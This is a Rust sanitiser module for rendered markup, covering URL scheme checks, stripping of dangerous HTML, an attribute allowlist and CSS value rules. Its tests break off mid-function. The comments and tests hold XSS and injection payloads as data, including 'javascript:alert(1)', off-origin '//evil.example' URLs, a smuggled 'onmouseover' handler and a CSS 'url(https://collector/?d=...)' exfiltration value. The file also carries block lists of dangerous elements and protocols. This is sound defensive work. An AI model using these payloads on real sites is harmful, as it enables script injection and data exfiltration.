//! Render-time injection-safety contract — the shared sanitisation floor every
//! string→markup seam routes through (the cross-host `SANITIZATION.md`
//! posture). Pure and dependency-free.
//!
//! Threat model: URL props block `javascript:` / `vbscript:` / `file:` / raw
//! `data:` schemes (http/https/mailto/tel/ftp/sftp + relative allowed);
//! markdown raw-HTML gets dangerous element blocks, tag-interior `on*=`
//! handlers, and dangerous protocols stripped as defence in depth on top of
//! the renderer's escape-by-construction; extra attributes hold the
//! `data-*` / `aria-*` allowlist.

use std::borrow::Cow;

const ALLOWED_URL_SCHEMES: &[&str] = &["http", "https", "mailto", "tel", "ftp", "sftp"];
const REJECTED_URL_SCHEMES: &[&str] = &["javascript", "vbscript", "file"];

/// Split a URL into its scheme candidate. A URL without a `:` before any `/`,
/// `?`, or `#` has no scheme (relative / fragment). ASCII whitespace + C0
/// controls are stripped from the candidate so `java\tscript:` classifies as
/// `javascript`.
///
/// Crate-visible so [`super::egress`] classifies a floor-accepted URL against
/// the SAME scheme reading the floor used — a second, private spelling of this
/// is exactly how two gates come to disagree about what a URL is.
pub(crate) fn extract_scheme(url: &str) -> Option<String> {
    let mut colon_idx = None;
    for (i, ch) in url.char_indices() {
        match ch {
            ':' => {
                colon_idx = Some(i);
                break;
            }
            '/' | '?' | '#' => break,
            _ => {}
        }
    }
    let colon = colon_idx?;
    let cleaned: String = url[..colon]
        .chars()
        .filter(|&c| (c as u32) > 0x20)
        .collect();
    Some(cleaned.trim().to_lowercase())
}

/// A protocol-relative URL: `//host/path` and the forms browsers fold into it.
/// WHATWG URL parsing treats `\` as `/` for special schemes, so `\\host`,
/// `/\host` and `\/host` all resolve exactly as `//host` does.
///
/// These carry no scheme, so the schemeless branch of [`sanitize_url`] would
/// otherwise admit them — but the browser resolves them against the CURRENT
/// page's scheme and lands on an OFF-ORIGIN host, defeating the same-origin
/// intent that makes a schemeless URL safe. On an `href` that is off-origin
/// navigation; on an image `src` it is an off-origin request that leaks the
/// Referer.
fn is_protocol_relative(url: &str) -> bool {
    let mut chars = url.chars();
    let is_sep = |c: Option<char>| matches!(c, Some('/') | Some('\\'));
    is_sep(chars.next()) && is_sep(chars.next())
}

/// §19 rule 1 — normalise exactly as the WHATWG URL Standard's basic URL parser
/// does before it parses anything, ASCII-exact, in this order:
///
/// 1. remove leading and trailing **C0 control or space** — all of U+0000–U+0020,
///    not merely the whitespace subset;
/// 2. remove every U+0009 / U+000A / U+000D from anywhere in what remains.
///
/// Deliberately **not** [`str::trim`]. A native trim answers a different question
/// in every language — Python's `strip` also removes U+001C–U+001F where Rust,
/// .NET, JS and Go do not; JS alone keeps U+0085 NEL where the other four drop it
/// — and all of them remove non-ASCII whitespace (U+00A0, U+2028, …) that the
/// parser keeps. The floor's whole purpose is that a tree vetted on one host is
/// safe on another, so the normalisation is defined by the parser that will
/// actually consume the string, not by the host's standard library.
///
/// Step 2 is those three code points **only**: the parser removes U+000B and
/// U+000C at the edges (step 1) and *keeps* them in the interior, so
/// `/<VT>/host/x` is an ordinary same-origin path and must stay one.
///
/// Returns a [`Cow`] so the common case — nothing to remove from the interior —
/// borrows a subslice rather than allocating.
fn normalize_url_for_floor(url: &str) -> Cow<'_, str> {
    let edges = url.trim_matches(|c: char| c <= '\u{20}');
    if edges.contains(['\t', '\n', '\r']) {
        Cow::Owned(edges.replace(['\t', '\n', '\r'], ""))
    } else {
        Cow::Borrowed(edges)
    }
}

/// The sanitised URL, or `None` if the scheme is rejected. Empty string passes
/// through (a valid same-page href); unknown schemes reject conservatively, and
/// so do protocol-relative URLs despite carrying no scheme (see
/// [`is_protocol_relative`]).
///
/// The input is first normalised per §19 rule 1 (see [`normalize_url_for_floor`]),
/// and that normalised form is also what is **returned** on acceptance — so an
/// accepted URL carrying an interior tab loses it, which is what the browser would
/// have parsed anyway. That is why the return type is a [`Cow`] rather than a
/// borrow of the input.
pub fn sanitize_url(url: &str) -> Option<Cow<'_, str>> {
    let trimmed = normalize_url_for_floor(url);
    if trimmed.is_empty() {
        return Some(trimmed);
    }
    match extract_scheme(&trimmed) {
        None if is_protocol_relative(&trimmed) => None, // off-origin despite having no scheme
        None => Some(trimmed),                          // relative / fragment / same-origin
        Some(scheme) => {
            if REJECTED_URL_SCHEMES.contains(&scheme.as_str()) {
                None
            } else if ALLOWED_URL_SCHEMES.contains(&scheme.as_str()) {
                Some(trimmed)
            } else {
                None // unknown scheme — reject by default
            }
        }
    }
}

/// WIRE_FORMAT.md 19.1 - the STRICTER floor for `Embed.src`, a slot that
/// EXECUTES rather than merely displaying.
///
/// Rules 1 and 2 are shared with [`sanitize_url`] verbatim - the same
/// normalisation, the same scheme extraction - and then rule 3 replaces the
/// accept set outright: **accept if and only if the scheme is `https`**.
///
/// Two of the exclusions are things the ordinary floor ACCEPTS, and both are
/// deliberate. `http` is refused because a document delivered over a channel any
/// intermediary can rewrite is an intermediary's script running in a frame this
/// page created. A **schemeless** reference is refused because it names a
/// same-origin document, and a same-origin frame is exactly the shape where a
/// guest granted both `AllowSameOrigin` and `AllowScripts` can reach its own
/// frame ELEMENT and strip the sandbox attribute off it.
///
/// `None` means the caller emits NO source attribute at all - not `about:blank`,
/// which an `<iframe>` would RENDER, and not the original value.
///
/// Accepting exactly one scheme means the class performs no positional test, so
/// it needs no rule-5 protocol-relative analogue and cannot inherit that
/// surface: `//host/x` has no scheme and is refused by rule 3 alone.
#[must_use]
pub fn sanitize_embed_src(url: &str) -> Option<String> {
    let normalised = normalize_url_for_floor(url);
    match extract_scheme(&normalised) {
        Some(scheme) if scheme == "https" => Some(normalised.into_owned()),
        _ => None,
    }
}

/// The URL itself if accepted, or `about:blank` — for call sites that must
/// emit *some* href to keep the element valid.
pub fn sanitize_url_or_blank(url: &str) -> String {
    sanitize_url(url)
        .map(Cow::into_owned)
        .unwrap_or_else(|| "about:blank".to_string())
}

const DANGEROUS_ELEMENTS: &[&str] = &[
    "script", "iframe", "object", "embed", "form", "link", "meta",
];
const DANGEROUS_PROTOCOLS: &[&str] = &["javascript:", "vbscript:"];

/// ASCII-case-insensitive substring search (chars, so indices stay aligned
/// with the source string across hosts).
fn index_of_ci(haystack: &[char], needle: &str, from: usize) -> Option<usize> {
    let needle: Vec<char> = needle.chars().map(|c| c.to_ascii_lowercase()).collect();
    if needle.is_empty() || haystack.len() < needle.len() {
        return None;
    }
    (from..=haystack.len() - needle.len()).find(|&i| {
        haystack[i..i + needle.len()]
            .iter()
            .zip(&needle)
            .all(|(a, b)| a.to_ascii_lowercase() == *b)
    })
}

fn index_of_any(haystack: &[char], chars: &[char], from: usize) -> Option<usize> {
    (from..haystack.len()).find(|&i| chars.contains(&haystack[i]))
}

/// Does `index` mark the end of a tag NAME?
///
/// An HTML tag name ends at whitespace, `/` or `>`, so a match on the bare
/// prefix is a match on a DIFFERENT element: `<metadata>` is not `<meta>`, and
/// `<linearGradient>` is not `<link>`. Both are real SVG elements the drawing
/// builder emits, and with the bare prefix the first of them lost its opening
/// tag to this sweep, leaving the provenance document's text loose in the
/// figure.
///
/// Requiring the boundary narrows only false positives: no spelling of a real
/// `<meta>` element survives it, because the name has to be delimited for a
/// parser to read it as that element in the first place. End of input counts as
/// a boundary, so a truncated `...<script` is still stripped.
///
/// Parity-locked with the F# `Sanitize.sanitizeMarkdownHtml` and the TypeScript
/// renderer's `sanitize.ts`.
fn is_tag_name_boundary(s: &[char], index: usize) -> bool {
    match s.get(index) {
        None => true,
        Some(c) => matches!(c, ' ' | '\t' | '\n' | '\r' | '/' | '>'),
    }
}

/// First `<tag` whose name is DELIMITED — the first position where `open_tag`
/// names the element rather than merely prefixing a longer name.
fn index_of_element_open(s: &[char], open_tag: &str) -> Option<usize> {
    let len = open_tag.chars().count();
    let mut from = 0usize;
    while let Some(i) = index_of_ci(s, open_tag, from) {
        if is_tag_name_boundary(s, i + len) {
            return Some(i);
        }
        from = i + 1;
    }
    None
}

/// Strip dangerous element blocks, tag-interior `on*=` handlers, and dangerous
/// protocols from a chunk of HTML. Approximate by design — the render path
/// constrains the input to the deterministic markdown renderer's output, so
/// the substring sweep is defence in depth, not the primary gate.
pub fn sanitize_markdown_html(html: &str) -> String {
    if html.is_empty() {
        return String::new();
    }
    let mut result: Vec<char> = html.chars().collect();

    // Remove balanced dangerous element blocks; iterate for nested / siblings.
    for tag in DANGEROUS_ELEMENTS {
        let open_tag = format!("<{tag}");
        let close_tag = format!("</{tag}>");
        while let Some(i) = index_of_element_open(&result, &open_tag) {
            if let Some(j) = index_of_ci(&result, &close_tag, i) {
                result.drain(i..j + close_tag.chars().count());
            } else if let Some(end) = index_of_any(&result, &['>'], i) {
                result.drain(i..=end);
            } else {
                result.truncate(i);
                break;
            }
        }
    }

    result = strip_event_handlers(result);

    result = strip_dangerous_protocols(result);

    result.into_iter().collect()
}

/// Rewrite `javascript:` / `vbscript:` URLs to `about:blank`, but only inside
/// tag interiors — the same discipline [`strip_event_handlers`] already keeps,
/// and here for the same reason.
///
/// Unanchored, this sweep rewrote VISIBLE PROSE. The markdown source
/// ``Never write `javascript:` in an href`` renders to a `<code>` element whose
/// TEXT is the literal token, and the substitution replaced it with
/// `about:blank` — so a document explaining the hazard could not state it, and
/// the reader was shown a sentence the author never wrote.
///
/// A real `javascript:` URL can only do harm as the VALUE of an attribute —
/// `href`, `src`, `action`, `formaction`, `xlink:href`, `data`, `poster` — and
/// every one of those sits inside a `<…>` tag. Restricting the scan to tag
/// interiors is therefore not a heuristic narrowing: it is the precise set of
/// positions where the token is a URL rather than a word. Outside a tag the
/// token is text the markdown renderer has already escaped by construction.
///
/// The interior test is the same backward scan the F# and TypeScript twins run:
/// from the match, the nearest preceding `<` means the interior is open, the
/// nearest preceding `>` (or the start of the document) means it is not. That is
/// approximate on arbitrary HTML — a `>` inside a quoted attribute value ends the
/// interior early — and sound on this function's documented input. Erring early
/// SKIPS a rewrite, the direction of error that leaves prose intact.
fn strip_dangerous_protocols(input: Vec<char>) -> Vec<char> {
    let mut result = input;
    for proto in DANGEROUS_PROTOCOLS {
        let mut search_from = 0usize;
        while let Some(i) = index_of_ci(&result, proto, search_from) {
            let mut inside_tag = false;
            let mut j = i;
            while j > 0 {
                j -= 1;
                if result[j] == '<' {
                    inside_tag = true;
                    break;
                }
                if result[j] == '>' {
                    break;
                }
            }
            if inside_tag {
                let replacement: Vec<char> = "about:blank".chars().collect();
                let replacement_len = replacement.len();
                result.splice(i..i + proto.chars().count(), replacement);
                search_from = i + replacement_len;
            } else {
                // Body text — left exactly as the author wrote it. Advancing is
                // what keeps the loop terminating now that a match no longer
                // always shortens the buffer.
                search_from = i + proto.chars().count();
            }
        }
    }
    result
}

/// Strip inline `on*="…"` event-handler attributes, anchored to tag interiors
/// (the `<…>` restriction keeps prose words like "one" / "only" intact — the
/// renderer escapes raw HTML, so a real handler can only sit inside a tag the
/// renderer itself emitted).
fn strip_event_handlers(input: Vec<char>) -> Vec<char> {
    let mut s = input;
    loop {
        let mut found: Option<usize> = None;
        let mut inside_tag = false;
        let n = s.len();
        for i in 0..n.saturating_sub(3) {
            let c0 = s[i].to_ascii_lowercase();
            if c0 == '<' {
                inside_tag = true;
            } else if c0 == '>' {
                inside_tag = false;
            } else if inside_tag
                && (c0 == ' ' || c0 == '\t' || c0 == '\n')
                && s[i + 1].eq_ignore_ascii_case(&'o')
                && s[i + 2].eq_ignore_ascii_case(&'n')
                && s[i + 3].is_ascii_alphabetic()
            {
                found = Some(i);
                break;
            }
        }
        let Some(found) = found else {
            return s;
        };
        let eq = index_of_any(&s, &['='], found);
        let next_space = index_of_any(&s, &[' ', '\t', '\n', '>'], found + 1);
        // The `=` position when this is a VALUED attribute, `None` when it is a
        // boolean one. Binding the position in the same match that decides the
        // case removes the `eq.expect("non-boolean branch has an '='")` that
        // used to re-derive it below: the claim was true, but it was a claim
        // about two expressions agreeing, kept true by nothing but proximity —
        // and it sat on a path reached by attacker-shaped markup, where the
        // release profile turned a wrong claim into an aborted host.
        let valued_at = match (eq, next_space) {
            (None, _) => None,
            (Some(e), Some(sp)) if sp < e => None,
            (Some(e), _) => Some(e),
        };
        let Some(eq) = valued_at else {
            // Boolean attribute like `onload` with no `=` — strip the name only.
            let stop_at = next_space.unwrap_or(s.len());
            s.drain(found..stop_at);
            continue;
        };
        {
            let mut v = eq + 1;
            while v < s.len() && (s[v] == ' ' || s[v] == '\t') {
                v += 1;
            }
            let stop_at = if v < s.len() && (s[v] == '\'' || s[v] == '"') {
                let quote = s[v];
                index_of_any(&s, &[quote], v + 1)
                    .map(|close| close + 1)
                    .unwrap_or(s.len())
            } else {
                index_of_any(&s, &[' ', '\t', '\n', '>'], v).unwrap_or(s.len())
            };
            s.drain(found..stop_at);
        }
    }
}

/// Allowlist predicate for an extra-attribute key: `data-*` / `aria-*` only,
/// with explicit rejection of `on*` handlers and `style`.
/// Positive character allowlist for an HTML attribute NAME: `[A-Za-z0-9-]`.
///
/// Everything else — `=`, quotes, backtick, `<`, `>`, `/`, space, tab, newline,
/// C0 controls, any non-ASCII byte — is rejected.
///
/// A **rejection** gate, not an escape, because HTML has no escape for an illegal
/// character in an attribute name: a space inside a name simply starts a NEW
/// attribute and an `=` starts its value. So `data-x=1 onmouseover=alert(1) z` is
/// not a mangled attribute name — it is three attributes, one of them a live event
/// handler. Renderers escape attribute *values*, never *names*, so dropping the
/// entry is the only sound response.
///
/// Public so an emission site can re-check it as defence in depth rather than
/// trusting upstream validation alone.
pub fn is_safe_attribute_name(name: &str) -> bool {
    !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
}

/// The `data-*` / `aria-*` allowlist, with explicit `on*` / `style` rejects, plus
/// [`is_safe_attribute_name`] over the whole trimmed key — without which a key
/// like `data-x=1 onmouseover=alert(1) z` satisfies the `data-` prefix and
/// smuggles a live event handler into rendered HTML.
///
/// Judges the TRIMMED form, so a caller using it directly must trim before
/// emission too.
pub fn is_allowed_extra_attribute_key(key: &str) -> bool {
    let trimmed = key.trim();
    if trimmed.is_empty()
        || trimmed.to_lowercase().starts_with("on")
        || trimmed.to_lowercase() == "style"
        || !is_safe_attribute_name(trimmed)
    {
        return false;
    }
    trimmed.starts_with("data-") || trimmed.starts_with("aria-")
}

/// Reject values carrying C0 control bytes (except tab) or angle brackets —
/// attribute-injection vectors under a verbatim-emission contract.
pub fn is_safe_extra_attribute_value(value: &str) -> bool {
    value
        .chars()
        .all(|ch| !(((ch as u32) < 0x20 && ch != '\t') || ch == '<' || ch == '>'))
}

// ─── Emission grammar for string-typed slots ─────────────────────────────────
//
// The Rust host's copy of the rule the F# tier declares in
// `Fuaran.UI.EmissionGrammar`, beside the URL floor above because it is the same
// KIND of rule and reaches the same sinks: a value the type says is a `str` and
// the document says is CSS, a paint, or an anchor token.
//
// WHY EVERY HOST NEEDS ITS OWN COPY, AND WHY THEY MUST AGREE. `templateColumns`
// is a free string on the wire, and this renderer concatenated it into
// `style="grid-template-columns:…"` with no rule at all — so a value carrying
// `;background:url(https://collector/?d=…)` closed the declaration, opened a
// second one the document never wrote, and fetched on RENDER, with no user act,
// outside the egress policy that governs every href and src in the same
// document. The React client assigned a style OBJECT and the browser dropped the
// identical value silently. Same tree, exfiltration channel here, inert there.
// The wire format exists to rule exactly that out.
//
// The rules are DENY-shaped for CSS and ALLOW-shaped for paints and tokens. A
// CSS value's grammar is genuinely open (the property and function sets grow,
// and a positive list would refuse `clamp()` the day CSS shipped it) while the
// set of characters that let a value LEAVE its declaration is small, stable and
// enumerable. A colour and an anchor token set are genuinely closed — every
// member is named in a specification, and a member nobody named is a member
// nobody vetted.

/// The attribute an emission site attaches beside a refused CSS value, so the
/// refusal is visible in the DOCUMENT and not only in a log. It carries the SLOT
/// name and never the value, the same discipline the egress refusal marker keeps
/// and for the same reason: a refused value is the payload.
pub const CSS_REFUSAL_ATTRIBUTE: &str = "data-fuaran-css-refused";

const CSS_FORBIDDEN_CHARS: &[char] = &[';', '{', '}', '\\'];
const CSS_FORBIDDEN_FUNCTIONS: &[&str] = &["url(", "expression("];

/// Is this string safe to concatenate into a CSS declaration?
///
/// What each refused character buys an attacker inside `style="<prop>:<value>"`:
/// `;` ends the declaration, so everything after it is a NEW property the author
/// never wrote; `{` and `}` end or open a RULE, reachable wherever the value
/// lands in a stylesheet; a backslash is CSS's own escape introducer, so `\\3b`
/// is a semicolon the character scan would otherwise never see — refusing the
/// introducer is what makes the rest of the list total; C0 controls and DEL are
/// parser-differential fodder and never meaningful in a value.
///
/// `url(` and `expression(` are refused by NAME rather than by character,
/// because their harm is not in their punctuation: `url(` fetches, which is the
/// finding, and `expression(` executes on legacy engines.
///
/// What this does NOT promise: it is not a CSS parser and says nothing about
/// whether the surviving string is a VALID value for the property it lands in.
/// An invalid value is dropped by the browser's own parser — a rendering defect,
/// not a security one. This bounds what a value can REACH.
///
/// An empty value is SAFE: it contributes nothing to the declaration, and
/// refusing it would make an absent value indistinguishable from a hostile one.
pub fn is_safe_css_value(value: &str) -> bool {
    for ch in value.chars() {
        if ch < ' ' || ch == '\u{7f}' || CSS_FORBIDDEN_CHARS.contains(&ch) {
            return false;
        }
    }
    // Case-insensitive and whitespace-tolerant on the CSS side: `URL (` and
    // `url<newline>(` are one token to a CSS tokenizer, so a scan for the
    // literal lowercase spelling alone is a scan a payload walks past.
    let squashed: String = value
        .chars()
        .filter(|c| !c.is_whitespace())
        .flat_map(|c| c.to_lowercase())
        .collect();
    !CSS_FORBIDDEN_FUNCTIONS
        .iter()
        .any(|fnname| squashed.contains(fnname))
}

/// The CSS value to emit: the value when it passes, the empty string when it
/// does not.
///
/// Empty rather than a substitute: an empty declaration value is dropped by
/// every CSS parser, so the element falls back to the stylesheet's own rule,
/// which is what an author who wrote nothing would have got. A substitute would
/// be the renderer inventing a layout the document never declared.
pub fn sanitize_css_value(value: &str) -> &str {
    if is_safe_css_value(value) { value } else { "" }
}

/// Is this a bare CSS IDENT — an ASCII letter or `-` followed by ASCII letters,
/// digits, `-` and `_`?
///
/// This is what admits the 148 named colours (`red`, `steelblue`,
/// `rebeccapurple`), the universal keywords (`none`, `transparent`,
/// `currentColor`), the inheritance keywords, the SVG2 paint keywords
/// (`context-fill`, `context-stroke`) and every colour keyword CSS has not
/// shipped yet — as ONE rule rather than as a list somebody has to keep.
///
/// Enumerating the keywords instead is wrong, because the two ways of being
/// wrong here are not symmetric. A missing keyword produces no error an author
/// can see: the paint is replaced by `none`, so a document that was correct
/// yesterday silently renders a differently-coloured picture. Meanwhile an ident
/// buys an attacker nothing at all — it cannot fetch, cannot leave its
/// declaration and cannot name a paint server, because every one of those needs
/// punctuation this test refuses.
fn is_css_ident(value: &str) -> bool {
    let mut chars = value.chars();
    match chars.next() {
        None => false,
        Some(head) if head.is_ascii_alphabetic() || head == '-' => {
            chars.all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
        }
        Some(_) => false,
    }
}

const COLOUR_FUNCTIONS: &[&str] = &[
    "rgb(", "rgba(", "hsl(", "hsla(", "oklch(", "oklab(", "lch(", "lab(", "color(",
];

/// Is this a CSS colour in the closed grammar — a `#rgb` / `#rrggbb` /
/// `#rrggbbaa` hex, one of the keywords, or a call to one of the named colour
/// functions?
///
/// A paint slot needs a POSITIVE grammar where a generic CSS value needs only a
/// denylist, and that asymmetry is the finding: `url(https://collector/x)`
/// contains no forbidden character, and in an SVG `fill` it names a paint server
/// the user agent FETCHES. Only naming what a colour may BE excludes it.
pub fn is_colour_value(value: &str) -> bool {
    let t = value.trim();
    if t.is_empty() {
        return false;
    }
    if let Some(digits) = t.strip_prefix('#') {
        let n = digits.chars().count();
        return (n == 3 || n == 4 || n == 6 || n == 8)
            && digits.chars().all(|c| c.is_ascii_hexdigit());
    }
    if is_css_ident(t) {
        return true;
    }
    let lower = t.to_lowercase();
    COLOUR_FUNCTIONS.iter().any(|f| lower.starts_with(f))
        && lower.ends_with(')')
        && is_safe_css_value(t)
}

/// The SVG paint to emit: the value when it is a colour, `"none"` when it is not.
///
/// `"none"` rather than the empty string, because an EMPTY `fill` / `stroke`
/// INHERITS the enclosing group's paint instead of clearing it — so an empty
/// refusal would silently paint the shape with whatever the enclosing group
/// declared, which is a different picture rather than an absent one.
pub fn sanitize_paint_value(value: &str) -> String {
    if is_colour_value(value) {
        value.trim().to_string()
    } else {
        "none".to_string()
    }
}

/// The two `target` values a Fuaran link may carry.
///
/// `_parent` and `_top` are meaningful only when the document is FRAMED, and a
/// framed document navigating its embedder is frame-busting the embedding host
/// did not consent to. A NAMED frame addresses a browsing context BY NAME, so a
/// decoded tree can navigate a window it did not create and whose contents it
/// cannot see, and the name is a free string with no way for a host to enumerate
/// what it might hit.
const ALLOWED_LINK_TARGETS: &[&str] = &["_self", "_blank"];

/// The closed `rel` token set. Every member describes THIS link's relationship
/// to its destination and changes nothing about the opener's capabilities in the
/// wrong direction. The one deliberate absence is the finding: `opener`
/// RE-ENABLES `window.opener` on a `_blank` link, handing the opened document a
/// live reference to the opening one — the capability `noopener` exists to
/// remove, and one no rendered tree has any reason to ask for.
const ALLOWED_LINK_REL_TOKENS: &[&str] = &[
    "alternate",
    "author",
    "bookmark",
    "external",
    "help",
    "license",
    "next",
    "nofollow",
    "noopener",
    "noreferrer",
    "prev",
    "privacy-policy",
    "search",
    "tag",
    "terms-of-service",
    "ugc",
];

/// The `target` to emit, or `None` to omit the attribute.
///
/// An unrecognised value degrades to `None` rather than to `_self`: the two are
/// the same navigation, and omitting says truthfully that the document declared
/// nothing this renderer could honour, where substituting would put a value in
/// the DOM the author never wrote.
pub fn sanitize_link_target(target: &str) -> Option<String> {
    let t = target.trim().to_lowercase();
    if ALLOWED_LINK_TARGETS.contains(&t.as_str()) {
        Some(t)
    } else {
        None
    }
}

/// The `rel` tokens to emit, given the declared `rel` and the SANITISED target:
/// surviving declared tokens first in declared order, then `noopener` and
/// `noreferrer` FORCED when the target is `_blank`.
///
/// The forcing is what closes the finding. Modern browsers imply `noopener`
/// there, which is exactly why the omission is dangerous rather than untidy: the
/// behaviour is a user-agent DEFAULT, an explicit `rel="opener"` overrides it,
/// and no document can know its reader's version floor. Emitting the tokens
/// makes the property a fact about the document rather than about the user
/// agent.
///
/// The ORDER is fixed so two hosts given one document emit one byte sequence; an
/// unordered set would make cross-host byte parity impossible to state.
pub fn sanitize_link_rel(rel: Option<&str>, sanitized_target: Option<&str>) -> Vec<String> {
    let mut declared: Vec<String> = Vec::new();
    if let Some(r) = rel {
        for token in r.split_whitespace() {
            let lowered = token.to_lowercase();
            if ALLOWED_LINK_REL_TOKENS.contains(&lowered.as_str()) && !declared.contains(&lowered) {
                declared.push(lowered);
            }
        }
    }
    if sanitized_target == Some("_blank") {
        for forced in ["noopener", "noreferrer"] {
            let f = forced.to_string();
            if !declared.contains(&f) {
                declared.push(f);
            }
        }
    }
    declared
}

/// The two anchor attributes, resolved TOGETHER — target first, then `rel`,
/// because the `rel` rule DEPENDS on the sanitised target. A site that sanitised
/// them independently would get the dependency wrong in exactly the case that
/// matters. Either result may be `None` to omit its attribute.
pub fn sanitize_link_anchor(
    target: Option<&str>,
    rel: Option<&str>,
) -> (Option<String>, Option<String>) {
    let safe_target = target.and_then(sanitize_link_target);
    let tokens = sanitize_link_rel(rel, safe_target.as_deref());
    let safe_rel = if tokens.is_empty() {
        None
    } else {
        Some(tokens.join(" "))
    };
    (safe_target, safe_rel)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn url_schemes() {
        assert_eq!(
            sanitize_url("https://x.dev/a").as_deref(),
            Some("https://x.dev/a")
        );
        assert_eq!(
            sanitize_url("/relative#frag").as_deref(),
            Some("/relative#frag")
        );
        assert_eq!(sanitize_url("javascript:alert(1)"), None);
        assert_eq!(sanitize_url("JAVAscript:alert(1)"), None);
        assert_eq!(sanitize_url("java\tscript:alert(1)"), None);
        assert_eq!(sanitize_url("data:text/html,x"), None);
        assert_eq!(sanitize_url("").as_deref(), Some(""));
        assert_eq!(sanitize_url_or_blank("vbscript:x"), "about:blank");
    }

    #[test]
    fn protocol_relative_urls_are_rejected() {
        // No scheme, so the schemeless branch would admit these — but the browser
        // resolves them against the current page's scheme and lands OFF-ORIGIN.
        // `\` is WHATWG's lenient normalisation of `/` for special schemes, so all
        // four two-separator forms resolve identically.
        for url in [
            "//evil.example/x",
            r"/\evil.example/x",
            r"\\evil.example/x",
            r"\/evil.example/x",
            "//",
            "  //evil.example/x", // rejection survives whitespace trimming
        ] {
            assert_eq!(
                sanitize_url(url).as_deref(),
                None,
                "expected rejection for {url:?}"
            );
            assert_eq!(sanitize_url_or_blank(url), "about:blank");
        }
    }

    /// §19 rule 1 — the WHATWG basic URL parser's own pre-parse normalisation.
    ///
    /// Control characters are written as escapes throughout: a raw C0 byte in
    /// source is invisible in review and does not survive a copy-paste, which is
    /// the wrong property for the payloads a security pin is made of.
    #[test]
    fn url_floor_normalises_as_the_url_parser_does() {
        // V1 — an interior TAB / LF / CR BETWEEN the two slash-ish characters.
        // Before rule 1 normalised, `/<TAB>/host/x` had first two characters `/`
        // and TAB, so `is_protocol_relative` read an ordinary relative reference
        // and accepted, while the browser removed the tab by the URL Standard's
        // step 2 and resolved `//host/x` OFF-ORIGIN. Verified against the WHATWG
        // parser: all twelve spellings resolve to `https://evil.example/x`.
        for c in ['\t', '\n', '\r'] {
            for a in ['/', '\\'] {
                for b in ['/', '\\'] {
                    let url = format!("{a}{c}{b}evil.example/x");
                    assert_eq!(sanitize_url(&url).as_deref(), None, "V1 {url:?}");
                }
            }
        }
        assert_eq!(sanitize_url("/\t\r/\nevil.example/x").as_deref(), None);

        // V2 — a LEADING C0 control that is not whitespace. No native trim removes
        // U+0001 or NUL, so the two slashes sat at positions 1 and 2 and
        // `is_protocol_relative` never saw them; the parser removes them by step 1
        // and resolves off-origin.
        for c in ['\u{1}', '\u{0}', '\u{1f}'] {
            let url = format!("{c}//evil.example/x");
            assert_eq!(sanitize_url(&url).as_deref(), None, "V2 {url:?}");
        }

        // Step 1 is the whole C0-or-space range, at both ends; and rule 1's output
        // is what gets RETURNED — an accepted URL loses its interior tab.
        assert_eq!(
            sanitize_url("https://good.example/x\u{1}").as_deref(),
            Some("https://good.example/x")
        );
        assert_eq!(
            sanitize_url("https://good.ex\tample/x").as_deref(),
            Some("https://good.example/x")
        );

        // U+000B and U+000C are removed at the EDGES by step 1 and KEPT in the
        // interior — the parser treats `/<VT>/host/x` as a same-origin path, and so
        // must the floor. Pinned because widening step 2 to "all C0" would silently
        // over-reject here.
        for c in ['\u{b}', '\u{c}'] {
            let url = format!("/{c}/evil.example/x");
            assert_eq!(sanitize_url(&url).as_deref(), Some(url.as_str()), "{url:?}");
        }

        // ASCII-exact LOOSENS these, correctly: the parser keeps them and resolves
        // an ordinary same-origin path, where `str::trim` removed them and the floor
        // then saw `//` and rejected. U+0085 is where JS diverged from Rust, .NET,
        // Python and Go; ASCII-exact ends the divergence in both directions.
        for c in ['\u{a0}', '\u{85}'] {
            let url = format!("{c}//evil.example/x");
            assert_eq!(sanitize_url(&url).as_deref(), Some(url.as_str()), "{url:?}");
        }

        // Rule 2 is UNCHANGED and still stricter than the browser, which is why V1
        // and V2 are off-origin navigation rather than script execution.
        assert_eq!(sanitize_url("java\tscript:alert(1)").as_deref(), None);
        assert_eq!(sanitize_url("java\u{b}script:alert(1)").as_deref(), None);
    }

    #[test]
    fn single_slash_relative_paths_still_pass() {
        for url in ["/", "/a", "/foo//bar", "./rel", "page", "#frag", "foo/bar"] {
            assert_eq!(
                sanitize_url(url).as_deref(),
                Some(url),
                "expected pass-through for {url:?}"
            );
        }
        // An absolute URL whose authority legitimately uses `//` is unaffected.
        assert_eq!(
            sanitize_url("https://ok.example/x").as_deref(),
            Some("https://ok.example/x")
        );
    }

    #[test]
    fn markdown_sweep_is_index_aligned_under_case_folding() {
        // This host already folds ASCII-only, so the sweep's search copy stays
        // index-aligned with the original. Pinned so a future switch to a
        // Unicode-aware fold (which is not length-preserving — U+0130 folds to two
        // chars) cannot silently reintroduce the sibling hosts' misalignment.
        assert_eq!(sanitize_markdown_html("İ<script>alert(1)</script>"), "İ");
        assert_eq!(
            sanitize_markdown_html("<p>İİ</p><SCRIPT>x</SCRIPT><p>b</p>"),
            "<p>İİ</p><p>b</p>"
        );
        assert_eq!(sanitize_markdown_html("İ<iframe src='x'></iframe>b"), "İb");
    }

    #[test]
    fn markdown_html_strips_dangerous_blocks() {
        assert_eq!(
            sanitize_markdown_html("<p>a</p><script>alert(1)</script><p>b</p>"),
            "<p>a</p><p>b</p>"
        );
        assert_eq!(
            sanitize_markdown_html("<a href=\"x\" onclick=\"evil()\">t</a>"),
            "<a href=\"x\">t</a>"
        );
        assert_eq!(
            sanitize_markdown_html("<a href=\"javascript:go()\">t</a>"),
            "<a href=\"about:blankgo()\">t</a>"
        );
        // Prose containing "on<letter>" after whitespace survives (tag-interior anchor).
        assert_eq!(
            sanitize_markdown_html("<p>the only one</p>"),
            "<p>the only one</p>"
        );
    }

    #[test]
    fn css_value_denylist_refuses_only_what_leaves_the_declaration() {
        // The finding's own payload: every character in it is individually
        // innocuous, which is why a character denylist rather than a validity
        // check is what catches it.
        assert!(!is_safe_css_value("1fr;background:url(https://collector/?d=x)"));
        assert!(!is_safe_css_value("a}b{color:red"));
        assert!(!is_safe_css_value("a\\3b b"));
        // Case-insensitive and whitespace-tolerant on the CSS side: `URL (` and
        // `url<newline>(` are one token to a CSS tokenizer.
        assert!(!is_safe_css_value("URL (x)"));
        // ALLOW twins. If these fail the grammar has become unusable rather than
        // strict, and every irregular grid is broken.
        assert!(is_safe_css_value("1fr 2fr auto"));
        assert!(is_safe_css_value("repeat(auto-fit, minmax(150px, 1fr))"));
